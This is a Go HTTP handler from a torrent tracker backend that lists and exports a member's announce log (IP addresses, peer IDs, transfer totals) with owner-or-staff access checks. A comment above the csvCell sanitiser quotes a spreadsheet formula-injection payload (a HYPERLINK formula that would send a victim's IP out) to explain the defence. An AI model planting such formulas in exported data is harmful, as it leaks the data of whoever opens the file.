package handler

import (
	"encoding/csv"
	"encoding/hex"
	"fmt"
	"log/slog"
	"net/http"
	"strconv"
	"time"

	"github.com/go-chi/chi/v5"

	"github.com/williamokano/go-torrent-trader/backend/internal/middleware"
	"github.com/williamokano/go-torrent-trader/backend/internal/repository"
	"github.com/williamokano/go-torrent-trader/backend/internal/service"
)

// announceLogMonthsShown is how many monthly totals the listing returns. Ten years
// is well past any retention window, so the cap only exists to keep an old
// account's response bounded.
const announceLogMonthsShown = 120

// announceLogExportPage is how many rows the export pulls per round trip. The
// response is streamed, so this bounds memory rather than the export's size.
const announceLogExportPage = 1000

// defaultAnnounceLogRetentionDays mirrors what migration 052 seeded and what the
// maintenance worker falls back to. Kept in step with cmd/server's
// announceLogRetention: the number this endpoint reports is the number the prune
// acts on.
const defaultAnnounceLogRetentionDays = 90

// AnnounceLogHandler serves a member's own announce log: the raw rows the tracker
// recorded about their client, the monthly totals that outlive them, and a CSV
// export of the lot.
//
// The log holds IP addresses and peer IDs, which makes it personal data — so a
// member being able to see and take away what is stored about them is an
// obligation, not a nicety. Staff see it too, because "your client reported this"
// is the evidence in every ratio dispute.
type AnnounceLogHandler struct {
	events   repository.AnnounceEventRepository
	rollups  repository.AnnounceRollupRepository
	settings *service.SiteSettingsService
}

// NewAnnounceLogHandler creates a new AnnounceLogHandler.
func NewAnnounceLogHandler(
	events repository.AnnounceEventRepository,
	rollups repository.AnnounceRollupRepository,
	settings *service.SiteSettingsService,
) *AnnounceLogHandler {
	return &AnnounceLogHandler{events: events, rollups: rollups, settings: settings}
}

// HandleList handles GET /api/v1/users/{id}/announce-log — the retained raw
// announces plus the monthly totals kept beyond retention.
func (h *AnnounceLogHandler) HandleList(w http.ResponseWriter, r *http.Request) {
	userID, ok := h.authorize(w, r)
	if !ok {
		return
	}

	page, perPage := parsePagination(r)

	events, total, err := h.events.ListByUser(r.Context(), userID, page, perPage)
	if err != nil {
		ErrorResponse(w, http.StatusInternalServerError, "internal_error", "failed to list announce log")
		return
	}

	periods, err := h.rollups.ListByUser(r.Context(), userID, announceLogMonthsShown)
	if err != nil {
		ErrorResponse(w, http.StatusInternalServerError, "internal_error", "failed to list monthly totals")
		return
	}

	items := make([]map[string]interface{}, len(events))
	for i := range events {
		items[i] = announceEventJSON(&events[i])
	}

	monthly := make([]map[string]interface{}, len(periods))
	for i := range periods {
		p := &periods[i]
		monthly[i] = map[string]interface{}{
			"year_month":         p.YearMonth,
			"uploaded":           p.Uploaded,
			"downloaded":         p.Downloaded,
			"counted_downloaded": p.CountedDownloaded,
			"announces":          p.Announces,
			"seed_announces":     p.SeedAnnounces,
			"ratio":              safeRatio(p.Uploaded, p.CountedDownloaded),
		}
	}

	JSON(w, http.StatusOK, map[string]interface{}{
		"events":   items,
		"total":    total,
		"page":     page,
		"per_page": perPage,
		"monthly":  monthly,
		// So the page can say how far back the raw rows go instead of leaving a
		// member to guess why last year's announces are missing.
		"retention_days": h.retentionDays(r),
	})
}

// HandleExport handles GET /api/v1/users/{id}/announce-log/export — the whole
// retained log as CSV.
func (h *AnnounceLogHandler) HandleExport(w http.ResponseWriter, r *http.Request) {
	userID, ok := h.authorize(w, r)
	if !ok {
		return
	}

	// Written before the first row so a failure mid-stream is the only case that
	// can produce a truncated file, rather than an HTML error inside a .csv.
	filename := fmt.Sprintf("announce-log-%d.csv", userID)
	w.Header().Set("Content-Type", "text/csv; charset=utf-8")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%q", filename))
	w.WriteHeader(http.StatusOK)

	cw := csv.NewWriter(w)
	defer cw.Flush()

	if err := cw.Write([]string{
		"announced_at", "torrent_id", "torrent_name", "event", "ip", "port", "peer_id",
		"uploaded", "downloaded", "left_bytes",
		"uploaded_delta", "downloaded_delta", "counted_downloaded_delta", "seeder",
	}); err != nil {
		slog.Error("announce log export: failed to write header", "user_id", userID, "error", err)
		return
	}

	// Keyset paging, oldest first: an export is a walk, and OFFSET would re-scan
	// everything already written on each page.
	var afterID int64
	for {
		batch, err := h.events.PageByUser(r.Context(), userID, afterID, announceLogExportPage)
		if err != nil {
			// Headers are already sent, so the client sees a short file. Logged
			// rather than swallowed: a silently truncated data export is worse than
			// a failed one.
			slog.Error("announce log export: failed to page events",
				"user_id", userID, "after_id", afterID, "error", err)
			return
		}
		if len(batch) == 0 {
			return
		}

		for i := range batch {
			e := &batch[i]
			torrentID := ""
			if e.TorrentID != nil {
				torrentID = strconv.FormatInt(*e.TorrentID, 10)
			}
			if err := cw.Write([]string{
				e.AnnouncedAt.UTC().Format(time.RFC3339),
				torrentID,
				csvCell(e.TorrentName),
				csvCell(e.Event),
				e.IP,
				strconv.Itoa(e.Port),
				// Hex, because a peer ID is arbitrary bytes: clients put raw
				// binary in it, and pasting that into a CSV cell would corrupt
				// the row.
				hex.EncodeToString(e.PeerID),
				strconv.FormatInt(e.Uploaded, 10),
				strconv.FormatInt(e.Downloaded, 10),
				strconv.FormatInt(e.LeftBytes, 10),
				strconv.FormatInt(e.UploadedDelta, 10),
				strconv.FormatInt(e.DownloadedDelta, 10),
				strconv.FormatInt(e.CountedDownloadedDelta, 10),
				strconv.FormatBool(e.Seeder),
			}); err != nil {
				slog.Error("announce log export: failed to write row",
					"user_id", userID, "event_id", e.ID, "error", err)
				return
			}
			afterID = e.ID
		}

		// Flush per batch so a long export streams instead of buffering entirely.
		cw.Flush()
		if err := cw.Error(); err != nil {
			slog.Error("announce log export: failed to flush", "user_id", userID, "error", err)
			return
		}

		if len(batch) < announceLogExportPage {
			return
		}
	}
}

// csvCell neutralises a leading character that a spreadsheet would read as the
// start of a formula.
//
// The point of this export is that someone opens it in Excel or LibreOffice, which
// is exactly what makes it dangerous: a torrent name is chosen by its uploader and
// appears in the export of every member who ever announced on it — including staff,
// who can export anyone's. `=HYPERLINK("http://…"&A1,"invoice")` in a name would
// otherwise become a live link in a stranger's spreadsheet, carrying that
// stranger's own IP address out with it.
//
// A leading apostrophe is the conventional fix: spreadsheets treat the cell as
// text, and the CSV writer quotes it so the value survives a round trip.
func csvCell(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@', '\t', '\r':
		return "'" + s
	}
	return s
}

// authorize resolves the target member from the URL and enforces owner-or-staff.
// Same gate as the activity tabs: this is a member's own transfer detail, and one
// member reading another's announce log would be reading their IP addresses.
func (h *AnnounceLogHandler) authorize(w http.ResponseWriter, r *http.Request) (int64, bool) {
	viewerID, _ := middleware.UserIDFromContext(r.Context())
	viewerPerms := middleware.PermissionsFromContext(r.Context())

	userID, err := strconv.ParseInt(chi.URLParam(r, "id"), 10, 64)
	if err != nil || userID <= 0 {
		ErrorResponse(w, http.StatusBadRequest, "bad_request", "invalid user ID")
		return 0, false
	}

	if viewerID != userID && !viewerPerms.IsStaff() {
		ErrorResponse(w, http.StatusForbidden, "forbidden", "you cannot view this user's announce log")
		return 0, false
	}
	return userID, true
}

// retentionDays reports the configured retention window. Zero is meaningful to the
// caller: it means pruning is disabled and the raw log is kept indefinitely, not
// that it is kept for no time at all.
//
// The default matches the worker's, deliberately. Two readers of one setting that
// disagree on its default is a bug that only shows up as the site telling a member
// one thing while the prune does another.
func (h *AnnounceLogHandler) retentionDays(r *http.Request) int {
	if h.settings == nil {
		return defaultAnnounceLogRetentionDays
	}
	days := h.settings.GetInt(r.Context(), service.SettingAnnounceLogRetentionDays, defaultAnnounceLogRetentionDays)
	if days < 0 {
		return 0
	}
	return days
}

func announceEventJSON(e *repository.AnnounceEventWithTorrent) map[string]interface{} {
	return map[string]interface{}{
		"id":                       e.ID,
		"torrent_id":               e.TorrentID,
		"torrent_name":             e.TorrentName,
		"event":                    e.Event,
		"ip":                       e.IP,
		"port":                     e.Port,
		"peer_id":                  hex.EncodeToString(e.PeerID),
		"uploaded":                 e.Uploaded,
		"downloaded":               e.Downloaded,
		"left_bytes":               e.LeftBytes,
		"uploaded_delta":           e.UploadedDelta,
		"downloaded_delta":         e.DownloadedDelta,
		"counted_downloaded_delta": e.CountedDownloadedDelta,
		"seeder":                   e.Seeder,
		"announced_at":             e.AnnouncedAt,
	}
}
